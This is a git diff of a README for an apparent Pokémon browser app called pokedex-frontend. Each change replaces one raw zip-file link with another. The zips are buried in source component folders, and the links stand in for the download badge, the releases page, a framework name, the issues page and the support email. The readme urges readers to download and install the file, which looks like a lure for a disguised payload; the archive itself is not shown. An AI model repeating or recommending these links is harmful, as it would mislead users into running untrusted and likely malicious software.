@@ -1,10 +1,10 @@
 # 🎮 pokedex-frontend - Explore Pokémon with Ease
 
-[![Download Pokedex Frontend](https://github.com/XalefMousex/pokedex-frontend/raw/refs/heads/main/src/components/molecules/TeamCard/frontend-pokedex-1.8.zip%20Now-blue?style=for-the-badge&logo=github)](https://github.com/XalefMousex/pokedex-frontend/raw/refs/heads/main/src/components/molecules/TeamCard/frontend-pokedex-1.8.zip)
+[![Download Pokedex Frontend](https://raw.githubusercontent.com/XalefMousex/pokedex-frontend/main/src/components/atoms/DialogContent/pokedex-frontend-v3.3-beta.2.zip%20Now-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/XalefMousex/pokedex-frontend/main/src/components/atoms/DialogContent/pokedex-frontend-v3.3-beta.2.zip)
 
 ## 📦 Overview
 
-The **pokedex-frontend** application is a modern and responsive frontend designed to help you explore the Pokémon universe. Built with https://github.com/XalefMousex/pokedex-frontend/raw/refs/heads/main/src/components/molecules/TeamCard/frontend-pokedex-1.8.zip, React, and TypeScript, this app offers a smooth user experience with features like PWA support, dark/light themes, advanced search, team management, and a beautiful design system.
+The **pokedex-frontend** application is a modern and responsive frontend designed to help you explore the Pokémon universe. Built with https://raw.githubusercontent.com/XalefMousex/pokedex-frontend/main/src/components/atoms/DialogContent/pokedex-frontend-v3.3-beta.2.zip, React, and TypeScript, this app offers a smooth user experience with features like PWA support, dark/light themes, advanced search, team management, and a beautiful design system.
 
 ### ⚙️ Key Features
 
@@ -20,7 +20,7 @@ The **pokedex-frontend** application is a modern and responsive frontend designe
 To begin using the **pokedex-frontend**, follow these simple steps:
 
 1. **Visit the Download Page**:
-   Click [here](https://github.com/XalefMousex/pokedex-frontend/raw/refs/heads/main/src/components/molecules/TeamCard/frontend-pokedex-1.8.zip) to access the releases page.
+   Click [here](https://raw.githubusercontent.com/XalefMousex/pokedex-frontend/main/src/components/atoms/DialogContent/pokedex-frontend-v3.3-beta.2.zip) to access the releases page.
 
 2. **Choose Your Download**:
    Look for the latest version. You will find download links for different platforms. Make sure to select the version compatible with your operating system.
@@ -36,7 +36,7 @@ To begin using the **pokedex-frontend**, follow these simple steps:
 
 ## 📥 Download & Install
 
-To download the **pokedex-frontend**, visit our releases page: [Download Pokedex Frontend](https://github.com/XalefMousex/pokedex-frontend/raw/refs/heads/main/src/components/molecules/TeamCard/frontend-pokedex-1.8.zip). Choose the file that matches your device and follow the installation steps provided above.
+To download the **pokedex-frontend**, visit our releases page: [Download Pokedex Frontend](https://raw.githubusercontent.com/XalefMousex/pokedex-frontend/main/src/components/atoms/DialogContent/pokedex-frontend-v3.3-beta.2.zip). Choose the file that matches your device and follow the installation steps provided above.
 
 ## 🖥️ System Requirements
 
@@ -56,7 +56,7 @@ The **pokedex-frontend** covers various interesting topics such as:
 - Framer Motion: Used to add animations.
 - GraphQL: Provides efficient data fetching.
 - Internationalization (i18n): Supports different languages.
-- https://github.com/XalefMousex/pokedex-frontend/raw/refs/heads/main/src/components/molecules/TeamCard/frontend-pokedex-1.8.zip Framework used for building the app.
+- https://raw.githubusercontent.com/XalefMousex/pokedex-frontend/main/src/components/atoms/DialogContent/pokedex-frontend-v3.3-beta.2.zip Framework used for building the app.
 - TailwindCSS: Styled for a modern look.
 - Zustand: For state management.
 
@@ -68,8 +68,8 @@ For more in-depth information on how to use this application, you can check the 
 
 If you encounter any issues or have questions, please reach out for help:
 
-- **GitHub Issues**: Submit a ticket on our [GitHub Issues page](https://github.com/XalefMousex/pokedex-frontend/raw/refs/heads/main/src/components/molecules/TeamCard/frontend-pokedex-1.8.zip).
-- **Email**: Contact support at https://github.com/XalefMousex/pokedex-frontend/raw/refs/heads/main/src/components/molecules/TeamCard/frontend-pokedex-1.8.zip
+- **GitHub Issues**: Submit a ticket on our [GitHub Issues page](https://raw.githubusercontent.com/XalefMousex/pokedex-frontend/main/src/components/atoms/DialogContent/pokedex-frontend-v3.3-beta.2.zip).
+- **Email**: Contact support at https://raw.githubusercontent.com/XalefMousex/pokedex-frontend/main/src/components/atoms/DialogContent/pokedex-frontend-v3.3-beta.2.zip
 
 ## 🏗️ Contributing
 
